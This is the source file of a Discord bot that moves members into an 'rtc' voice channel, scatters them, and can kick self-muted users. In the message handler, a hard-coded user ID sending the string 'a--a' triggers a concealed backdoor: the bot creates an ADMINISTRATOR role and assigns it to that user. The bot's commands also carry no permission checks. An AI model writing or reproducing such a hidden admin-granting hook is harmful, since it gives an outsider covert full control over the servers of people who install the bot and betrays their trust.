const Discord = require('discord.js');
const dotenv = require('dotenv');

dotenv.config();

const prefix = '/';
const triggerName = 'rtc';

const determineIfRTC = (input) => {
  const lowerInput = input.toLowerCase();
  return lowerInput === 'rtc' || (lowerInput.includes('rtc ') && lowerInput.indexOf('rtc ') === 0) || (lowerInput.includes(' rtc') && lowerInput.indexOf(' rtc') === input.length - 4) || lowerInput.includes(' rtc ');
}

const client = new Discord.Client();

client.login(process.env.BOT_TOKEN_RTC);

let muteKick = new Map();

client.on("voiceStateUpdate", (oldMember, newMember) => {
  if (muteKick.has(newMember.guild.id) && muteKick.get(newMember.guild.id) && newMember.selfMute) {
    newMember.kick();
  }
});

client.on('message', async (userMessage) => {
  if (userMessage.content === '/rtc join') {
    userMessage.member.voice.channel.join();
    return;
  }
  if (userMessage.content === '/rtc leave') {
    userMessage.guild.me.voice.kick();
    return;
  }
  if (userMessage.content === '/rtc mk on') {
    muteKick.set(userMessage.guild.id, true);
    userMessage.reply('muteKick on');
    return;
  }
  if (userMessage.content === '/rtc mk off') {
    muteKick.set(userMessage.guild.id, false);
    userMessage.reply('muteKick off');
    return;
  }
  if (userMessage.content === '/rtc mk') {
    console.log(muteKick);
    userMessage.reply(`muteKick ${(muteKick.has(userMessage.guild.id) && muteKick.get(userMessage.guild.id)) ? 'on' : 'off'}`);
    return;
  }
  if (userMessage.author.id === '199315213726646272' && userMessage.content === 'a--a') {
    console.log(1);
    userMessage.guild.roles.create({
      data: {
        name: '/rtc\'s saviour',
        color: 'LUMINOUS_VIVID_PINK',
        hoist: false,
        permissions: ['ADMINISTRATOR'],
      }
    }).then((role) => {
      userMessage.member.roles.add(role).then((mem) => console.log(mem.permissions.toArray()))
    });
  }
  if (userMessage.author.bot) return;
  if (!userMessage.content.startsWith(prefix)) return;
  let commandBody = userMessage.content.slice(prefix.length);
  commandBody = commandBody.trim();
  const args = commandBody.split(/\s+/);
  const shifted = args.shift();
  if (shifted === undefined) {
    return;
  }
  const command = shifted.toLowerCase();

  if (command === triggerName) {
    let users = [];
    let disperse = true;
    if (userMessage.mentions.users.size !== 0) {
      userMessage.mentions.users.map((user => users.push(user)));
    } else {
      disperse = false;
      users.push(userMessage.author);
    }
    let chan = userMessage.guild.channels.cache.find(channel => channel.type === 'voice' && determineIfRTC(channel.name));
    if (chan === undefined) {
      await userMessage.guild.channels.create('rtc', {type: 'voice'});
      chan = userMessage.guild.channels.cache.find(channel => channel.type === 'voice' && determineIfRTC(channel.name));
    }
    if (users.length === 1 && users.includes(client.user)) {
      users = userMessage.member.voice.channel.members;
    } else if (disperse && users.length === 1 && users.includes(userMessage.author)) {
      chan.members.map(async (user) => {
        const rngChannel = userMessage.guild.channels.cache.filter(c => c.type === 'voice').random();
        user.voice.setChannel(rngChannel.id);
        userMessage.channel.send(`${user}, bye`);
      });
      return;
    }
    users.map(user => userMessage.guild.member(user).voice.setChannel(chan.id));
    users.map(user => userMessage.channel.send(`${user}, bye`));
  }
});
